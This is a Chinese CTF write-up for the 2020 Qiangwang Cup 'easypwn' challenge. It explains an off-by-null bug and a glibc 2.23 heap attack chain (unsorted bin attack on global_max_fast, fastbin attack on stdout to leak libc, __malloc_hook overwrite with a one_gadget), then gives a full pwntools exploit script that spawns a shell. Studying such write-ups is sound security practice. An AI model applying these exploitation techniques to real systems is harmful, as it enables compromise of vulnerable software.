# easypwn

## 来源
2020 强网杯


## 难度

6 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enable
 ```

## 简单描述

只有三个功能, 添加, 编辑, 删除, 设置了global_max_fast的大小, 释放内存没法构成fastbin

```
unsigned __int64 sub_ACE()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  if ( !mallopt(1, 0) )                         // set not malloc as fastbin
    exit(-1);
  return __readfsqword(0x28u) ^ v1;
}
```



## vul

```c
unsigned __int64 __fastcall read_n(__int64 ptr, int size)
{
  char buf; // [rsp+1Fh] [rbp-11h]
  int i; // [rsp+20h] [rbp-10h]
  int _i; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  for ( i = -1; ; *(_BYTE *)(ptr + i) = buf )
  {
    _i = i;
    if ( i + 1 >= (unsigned int)(size + 1) )
      break;
    if ( size - 1 == _i )
    {
      buf = 0;                                  // vul off by null
      *(_BYTE *)(ptr + ++i) = 0;
      return __readfsqword(0x28u) ^ v6;
    }
    if ( (signed int)read(0, &buf, 1uLL) <= 0 )
      exit(-1);
    if ( buf == 10 )
      return __readfsqword(0x28u) ^ v6;
    ++i;
  }
  return __readfsqword(0x28u) ^ v6;
}
```

在输入的函数中存在off by null漏洞

## 知识点

global_max_fast, unsorted bin attack, fastbin attack, parital write, io file, hook hijack

## 思路

利用parital write和unsorted bin attack 修改 global_max_fast值为比较大的值, 一般为main_arena + 0x58, 该值一般符合0x7f以内, 所以可以采用该方法恢复, fastbin attack攻击条件, 利用parital write和fastbin attack 打入IO_2_1_stdout, 然后泄漏libc, 最后再利用fastbin attack 打入 malloc_hook - 0x23修改malloc_hook, realloc来调整execve第二个参数, 打通几率  1/ 16 * 1 / 16 = 1 / 256



## exp

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# author: i0gan
# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'

elf_path  = './easypwn'
MODIFY_LD = 0
arch = '64'
libc_v = '2.23'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
#libc_path = './libc.so.6'
#libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "0.0.0.0"
server_port = 0

# if local debug
LOCAL = 1
LIBC  = 1

#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)

def ad(size):
	sla(':', str(1))
	sla(':', str(size))

def rm(idx):
	sla(':', str(3))
	sla(':', str(idx))

def md(idx, data):
	sla(':', str(2))
	sla(':', str(idx))
	sa(':', data)

def q():
	sla(':', str(5))	

#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	ad(0x68) # idx 0
	ad(0x88) # idx 1
	ad(0x68) # idx 2 f
	ad(0xf8) # idx 3
	ad(0x68) # idx 4 f

	# for second attack
	ad(0x68) # idx 5
	ad(0x88) # idx 6
	ad(0x68) # idx 7 f
	ad(0xf8) # idx 8
	ad(0x68) # idx 9 f

	ad(0x68) # idx 10 f

	rm(1)
	md(2, b'A' * 0x60 + p64(0x100)) #off by null set top chunk pre_inuse bit  as null
	# make chunk 3 merge to chunk 1
	rm(3)
	ad(0x88) # idx 1
	ad(0x68) # idx 3, replace chunk 2, two ptr pointer to same memory
	# modify global_max_fast to make a condition for fastbin attack	
	ad(0x68) # idx 11 -> old chunk 3 
	ad(0x88) # idx 12 -> old chunk 3

	
	rm(6)
	md(7, b'A' * 0x60 + p64(0x100))
	rm(8)  # make chunk 8 merget to chunk 6
	ad(0x88) # idx 6 -> old chunk  6
	ad(0x68) # idx 8 -> old chunk 7
	ad(0xf8) # idx 13 -> old chunk 8
	
	# modify global_max_fast = 0x7f
	rm(5) #
	rm(3) # -> old chunk 2
	# make bd pointer to main_arena + 8 (global_max_fast - 0x10)
	# 0x7ffff7dd37f8 <global_max_fast>:       0x0000000000000010      0x0000000000000000
	md(2, p64(0) + b'\x38\x38\n')
	#db()
	ad(0x68) # idx 3
	ad(0x68) # idx 5
	# unsorted bin attack to modify global_max_fast value as big number(main_arena + 0x58)
	rm(3)
	
	# stage 2
	rm(11) # -> old chunk 3, for cleanning fastbin
	rm(7)  #
	md(8, '\x00\n') # -> chunk 7, make fd -> chunk 2
	md(2, '\xdd\x25\n')
	
	ad(0x68) # idx 3 for ajust
	ad(0x68) # idx 7 for ajust
	# attack to _IO_2_1_stderr + 157 to leak libc
	ad(0x68) # idx 11
	p = b'\x11' * 0x33
	p += p64(0xfbad3887)
	p += p64(0) * 3
	p += b'\x40\n'
	md(11, p)
	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
	libc_base = leak - (0x7ffff7fc2640 - 0x7ffff7c26000)
	li('leak: ' + hex(leak))
	li('libc_base: ' + hex(libc_base))

	libc.address = libc_base
	one_gadget = libc_base + 0x3f42a

	# fastbin attack to malloc_hook - 0x23
	rm(2)
	rm(10)
	rm(5)

	ad(0x68) # idx 2
	md(2, p64(libc.sym['__malloc_hook'] - 0x23) + p64(0) + b'\n')

	ad(0x68) # idx 5
	ad(0x68) # idx 10
	ad(0x68) # idx 14

	p = b'\x00' * (0x13 - 8)
	p += p64(one_gadget)
	p += p64(libc.sym['realloc'] + 8)
	p += b'\n'
	md(14, p)

	# get shell
	ad(0x10)
	

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()

```

